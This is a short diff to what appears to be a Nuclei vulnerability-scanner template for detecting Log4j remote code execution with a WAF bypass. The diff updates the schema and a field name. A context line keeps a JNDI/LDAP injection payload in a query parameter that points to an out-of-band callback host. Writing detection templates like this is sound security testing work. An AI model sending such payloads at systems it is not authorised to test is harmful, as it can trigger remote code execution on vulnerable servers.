@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: log4j-rce-detect-waf-bypass
 
 info:
@@ -5,7 +6,7 @@ info:
   author: h0tak88r
   severity: critical
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/?q=${jndi:ldap://{{interactsh-url}}/poc}"
